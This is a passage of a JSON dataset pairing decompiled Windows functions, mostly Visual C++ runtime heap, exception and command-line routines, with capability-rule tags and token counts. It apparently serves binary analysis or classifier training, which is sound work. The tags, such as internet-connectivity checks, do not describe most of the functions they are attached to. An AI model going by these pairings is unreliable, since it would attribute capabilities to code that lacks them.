          }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x4686e4 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x4686fc * 0x8000 + (*0x4686e4)[3], 0x8000, 0x4000);\n                (*0x4686e4)[2] = (*0x4686e4)[2] | 0x80000000U >> (*0x4686fc & 0x1f);\n                *((*0x4686e4)[4] + 0xc4 + *0x4686fc * 4) = 0;\n                *((*0x4686e4)[4] + 0x43) = *((*0x4686e4)[4] + 0x43) + -1;\n                if (*((*0x4686e4)[4] + 0x43) == '\\0') {\n                    (*0x4686e4)[1] = (*0x4686e4)[1] & 0xfffffffe;\n                }\n                if ((*0x4686e4)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x4686e4)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x468700, 0, (*0x4686e4)[4]);\n                    fcn.004105b0(*0x4686e4, *0x4686e4 + 5, (*0x4686e8 * 0x14 - *0x4686e4) + -0x14 + *0x4686ec);\n                    *0x4686e8 = *0x4686e8 + -1;\n                    if (*0x4686e4 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x4686f4 = *0x4686ec;\n                }\n            }\n            *0x4686e4 = arg_8h;\n            *0x4686fc = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2180
    },
    "00417053": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00417053(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uint var_138h;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    int32_t **var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(*0x4686ec, *0x4686e8 * 0x14);\n    if (iVar3 != 0) {\n        return 0xffffffff;\n    }\n    var_1ch = 0;\n    puVar11 = *0x4686ec;\n    if (0 < *0x4686e8) {\n        do {\n            uVar5 = puVar11[4];\n            var_34h = puVar11;\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(uVar5, 0x41c4);\n            if (iVar3 != 0) {\n                return 0xfffffffe;\n            }\n            var_8h = puVar11[3];\n            var_24h = uVar5 + 0x144;\n            var_20h = puVar11[2];\n            puVar12 = uVar5 + 0xc4;\n            var_10h = 0;\n            var_14h = 0;\n            var_ch = 0;\n            do {\n                var_28h = 0;\n                var_18h = 0;\n                var_4h = NULL;\n                bVar14 = -1 < var_20h;\n                puVar13 = &var_138h;\n                var_38h = puVar12;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                if (bVar14) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(var_8h, 0x8000);\n                    if (iVar3 != 0) {\n                        return 0xfffffffc;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_8h + 0x3ff;\n                    do {\n                        ppiVar4 = ppiVar9 + -0x3fc;\n                        if ((ppiVar9[-0x3fd] != 0xffffffff) || (*ppiVar9 != 0xffffffff)) {\n                            return 0xfffffffb;\n                        }\n                        do {\n                            piVar2 = *ppiVar4;\n                            if ((piVar2 & 1) == 0) {\n                                iVar8 = (piVar2 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                (&var_138h)[iVar8] = (&var_138h)[iVar8] + 1;\n                                piVar6 = piVar2;\n                            }\n                            else {\n                                if (0x400 < piVar2 - 1U) {\n                                    return 0xfffffffa;\n                                }\n                                var_4h = var_4h + 1;\n                                piVar6 = piVar2 - 1U;\n                            }\n                            if (((piVar6 < 0x10) || ((piVar6 & 0xf) != 0)) || (0xff0 < piVar6)) {\n                                return 0xfffffff9;\n                            }\n                            ppiVar4 = piVar6 + ppiVar4;\n                            if (ppiVar4[-1] != piVar2) {\n                                return 0xfffffff8;\n                            }\n                        } while (ppiVar4 < ppiVar9);\n                        if (ppiVar4 != ppiVar9) {\n                            return 0xfffffff8;\n                        }\n                        ppiVar9 = ppiVar9 + 0x400;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 8);\n                    if (*var_24h != var_4h) {\n                        return 0xfffffff7;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_24h;\n                    do {\n                        var_4h = NULL;\n                        var_30h = ppiVar9 + 2;\n                        ppiVar4 = ppiVar9[1];\n                        var_2ch = ppiVar9;\n                        ppiVar10 = var_30h;\n                        if (ppiVar4 != ppiVar9) {\n                            do {\n                                if (var_4h == (&var_138h)[iVar3]) break;\n                                if ((ppiVar4 < var_8h) || (var_8h + 0x2000 <= ppiVar4)) {\n                                    return 0xfffffff6;\n                                }\n                                ppiVar7 = (ppiVar4 & 0xfffff000) + 0xc;\n                                ppiVar1 = (ppiVar4 & 0xfffff000) + 0xffc;\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                do {\n                                    if (ppiVar7 == ppiVar4) break;\n                                    ppiVar7 = ppiVar7 + (*ppiVar7 & 0xfffffffe);\n                                    ppiVar10 = var_30h;\n                                } while (ppiVar7 != ppiVar1);\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                iVar8 = (*ppiVar4 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                if (iVar8 != iVar3) {\n                                    return 0xfffffff4;\n                                }\n                                if (ppiVar4[2] != var_2ch) {\n                                    return 0xfffffff3;\n                                }\n                                var_4h = var_4h + 1;\n                                var_2ch = ppiVar4;\n                                ppiVar4 = ppiVar4[1];\n                            } while (ppiVar4 != ppiVar9);\n                            if (var_4h != NULL) {\n                                if (iVar3 < 0x20) {\n                                    uVar5 = 0x80000000 >> (iVar3 & 0x1f);\n                                    var_28h = var_28h | uVar5;\n                                    var_10h = var_10h | uVar5;\n                                }\n                                else {\n                                    uVar5 = 0x80000000 >> (iVar3 - 0x20 & 0x1f);\n                                    var_18h = var_18h | uVar5;\n                                    var_14h = var_14h | uVar5;\n                                }\n                            }\n                        }\n                        if ((var_2ch[1] != ppiVar9) || (var_4h != (&var_138h)[iVar3])) {\n                            return 0xfffffff2;\n                        }\n                        if (*ppiVar10 != var_2ch) {\n                            return 0xfffffff1;\n                        }\n                        iVar3 = iVar3 + 1;\n                        puVar11 = var_34h;\n                        puVar12 = var_38h;\n                        ppiVar9 = ppiVar10;\n                    } while (iVar3 < 0x40);\n                }\n                if ((var_28h != puVar12[-0x20]) || (var_18h != *puVar12)) {\n                    return 0xfffffff0;\n                }\n                var_8h = var_8h + 0x2000;\n                var_24h = var_24h + 0x81;\n                var_20h = var_20h << 1;\n                var_ch = var_ch + 1;\n                puVar12 = puVar12 + 1;\n            } while (var_ch < 0x20);\n            if ((var_10h != *puVar11) || (var_14h != puVar11[1])) {\n                return 0xffffffef;\n            }\n            puVar11 = puVar11 + 5;\n            var_1ch = var_1ch + 1;\n            var_38h = puVar12;\n        } while (var_1ch < *0x4686e8);\n    }\n    return 0;\n}\n",
        "token_count": 2021
    },
    "004173c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004173c7(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x4686ec + *0x4686e8 * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x4686f4 < puVar10;\n    arg_8h = *0x4686f4;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x4686ec;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x4686f4 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x4686f4) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x4686ec;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x4686f4 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x4686f4) && (arg_8h = fcn.00416ae6(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.00416b9d(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x4686f4 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x00417680;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x00417680:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x4686e4)) && (var_4h == *0x4686fc)) {\n        *0x4686e4 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2107
    },
    "00417708": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00417708(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x467238) {\n        do {\n            if (*(iVar12 * 4 + 0x467240) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x467280, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x467240) == uVar10) goto code_r0x00417903;\n                iVar12 = *0x467238 + -1;\n                if (iVar12 < 0) goto code_r0x004178f1;\n                goto code_r0x004178e1;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x467238);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x467280, 1);\n    iVar12 = *0x467238;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x467238;\n    if (0 < *0x467238) {\n        puVar8 = *0x467238 * 4 + 0x46723c;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x467238 < 0x10) {\n            iVar7 = *0x467238;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x467240;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x467238 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x467280, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x004178e1:\n        if (*(iVar12 * 4 + 0x467240) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x004178f1:\n        if (*0x467238 < 0x10) {\n            *0x467238 = *0x467238 + 1;\n        }\n        iVar12 = *0x467238 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x0041791b;\ncode_r0x00417903:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x467240;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x0041791b:\n    (*pcVar3)(0x467280, 0);\n    return 1;\n}\n",
        "token_count": 1615
    },
    "004179c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004179c6(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x4644c0)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x4644c0)) {\n        if ((*0x46707c == 1) || ((*0x46707c == 0 && (*0x4640c4 == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x4644c4);\n            uStack296 = fcn.00411cb0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.004190f0();\n            }\n            iVar2 = fcn.00411cb0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.00411cb0();\n                fcn.0041c4a0();\n            }\n            fcn.00411cb0();\n            fcn.00411cb0();\n            fcn.004112a0();\n            fcn.004190f0();\n            fcn.00419100();\n            fcn.00419100();\n            fcn.00419100();\n            fcn.0041c3a0(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x417b32;\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 546
    },
    "00417bcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417bcc(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.00414501();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x4645dc * 3);\n    if ((piVar1 + *0x4645dc * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x4645d0 < *0x4645d4 + *0x4645d0) {\n                    iVar6 = *0x4645d0 * 0xc;\n                    iVar8 = *0x4645d0;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x4645d4 + *0x4645d0);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 857
    },
    "00417e6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417e6f(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x468721) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x00417ee8;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x00417ee8:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = 